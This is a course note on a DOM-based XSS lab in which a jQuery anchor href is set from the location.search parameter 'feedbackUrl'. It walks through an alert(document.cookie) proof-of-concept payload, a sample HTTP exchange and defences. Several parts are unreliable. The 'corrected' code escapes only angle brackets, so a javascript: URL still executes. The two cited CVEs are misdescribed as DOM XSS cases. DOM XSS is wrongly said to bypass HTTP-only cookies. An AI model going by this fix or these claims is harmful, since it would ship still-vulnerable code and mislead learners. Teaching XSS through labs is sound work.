---
course: Web Security
topic: Cross-Site Scripting (XSS)
tags: [web-security]
---

## Introduction to Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to various harmful outcomes, such as stealing sensitive information, performing actions on behalf of the user, or even taking control of the user's account. There are three main types of XSS vulnerabilities: Stored XSS, Reflected XSS, and DOM-Based XSS. In this chapter, we will focus on DOM-Based XSS, specifically within the context of a jQuery anchor `href` attribute sink using `location.search` as the source.

### What is DOM-Based XSS?

DOM-Based XSS occurs when the vulnerability exists in the client-side JavaScript code rather than in the server-side code. The attacker manipulates the DOM (Document Object Model) to execute malicious scripts. Unlike Stored and Reflected XSS, where the payload is typically stored in the database or reflected back from the server, DOM-Based XSS relies on the client-side script to render the payload.

#### Why Does DOM-Based XSS Matter?

DOM-Based XSS is particularly dangerous because it often bypasses standard security measures like Content Security Policy (CSP) and HTTP-only cookies. Since the payload is executed directly within the client-side script, it can manipulate the DOM and potentially steal sensitive information like session tokens or cookies.

### Understanding the Lab Setup

In this lab, we are dealing with a DOM-based XSS vulnerability in the "submit feedback" page. The vulnerability arises from the way the jQuery library is used to modify the `href` attribute of an anchor (`<a>`) element based on data from `location.search`.

#### The Vulnerable Code

Let's look at the vulnerable code snippet:

```javascript
$(document).ready(function() {
    var url = new URL(window.location.href);
    var searchParams = url.searchParams;
    var feedbackUrl = searchParams.get('feedbackUrl');
    
    $('#backLink').attr('href', feedbackUrl);
});
```

Here, the `feedbackUrl` parameter is extracted from the `location.search` and used to set the `href` attribute of the anchor element with the ID `#backLink`. If an attacker can control the value of `feedbackUrl`, they can inject a malicious script.

### Exploiting the Vulnerability

To exploit this vulnerability, we need to craft a URL that includes a payload in the `feedbackUrl` parameter. The goal is to make the `back` link execute a script that alerts the document's cookies.

#### Crafting the Payload

The payload we want to inject is a script that alerts the document's cookies. Here’s how we can construct the URL:

```
https://example.com/submit_feedback?feedbackUrl=javascript:alert(document.cookie);
```

When this URL is loaded, the `feedbackUrl` parameter will contain the JavaScript payload, which will be set as the `href` attribute of the `#backLink` element.

### Full HTTP Request and Response

Let's see the full HTTP request and response for this scenario:

```http
GET /submit_feedback?feedbackUrl=javascript:alert(document.cookie); HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!DOCTYPE html>
<html>
<head>
    <title>Submit Feedback</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <h1>Submit Feedback</h1>
    <a id="backLink" href="javascript:alert(document.cookie);">Back</a>
    <script>
        $(document).ready(function() {
            var url = new URL(window.location.href);
            var searchParams = url.searchParams;
            var feedbackUrl = searchParams.get('feedbackUrl');
            
            $('#backLink').attr('href', feedbackUrl);
        });
    </script>
</body>
</html>
```

### How to Prevent / Defend Against DOM-Based XSS

#### Secure Coding Practices

To prevent DOM-Based XSS, it is crucial to ensure that user input is properly sanitized and validated before being used in the DOM. Here are some steps to secure the code:

1. **Input Validation**: Validate the input to ensure it does not contain any malicious scripts.
2. **Output Encoding**: Encode the output to prevent it from being interpreted as executable code.

Here’s the corrected version of the code:

```javascript
$(document).ready(function() {
    var url = new URL(window.location.href);
    var searchParams = url.searchParams;
    var feedbackUrl = searchParams.get('feedbackUrl');
    
    // Sanitize the input
    feedbackUrl = feedbackUrl.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    
    $('#backLink').attr('href', feedbackUrl);
});
```

#### Content Security Policy (CSP)

Implementing a Content Security Policy (CSP) can also help mitigate the risk of XSS attacks. CSP allows you to specify trusted sources of content, thereby preventing the execution of unauthorized scripts.

Example CSP header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://code.jquery.com;
```

This CSP directive restricts the sources of scripts to the current domain and the jQuery CDN.

### Real-World Examples

#### Recent Breaches and CVEs

One notable example of a DOM-Based XSS vulnerability is CVE-2021-21972, which affected several popular websites. Attackers exploited a vulnerability in the JavaScript code to inject malicious scripts, leading to the theft of sensitive information.

Another example is CVE-2022-22965, which affected a widely-used JavaScript library. The vulnerability allowed attackers to inject scripts via the `location.search` parameter, similar to our lab scenario.

### Hands-On Practice

For hands-on practice with DOM-Based XSS, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs focused on different types of XSS vulnerabilities, including DOM-Based XSS.
- **OWASP Juice Shop**: A deliberately insecure web application that includes several XSS vulnerabilities, including DOM-Based XSS.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application with various security vulnerabilities, including XSS.

These labs provide a safe environment to practice and understand the nuances of DOM-Based XSS.

### Conclusion

DOM-Based XSS is a critical vulnerability that can have severe consequences if not properly mitigated. By understanding the underlying mechanisms and implementing secure coding practices, you can significantly reduce the risk of such vulnerabilities. Always validate and sanitize user inputs, and consider implementing additional security measures like Content Security Policy to further protect your applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/06-Lab 5 DOM XSS in jQuery anchor href attribute sink using locationsearch source/00-Overview|Overview]] | [[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/06-Lab 5 DOM XSS in jQuery anchor href attribute sink using locationsearch source/02-Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]]
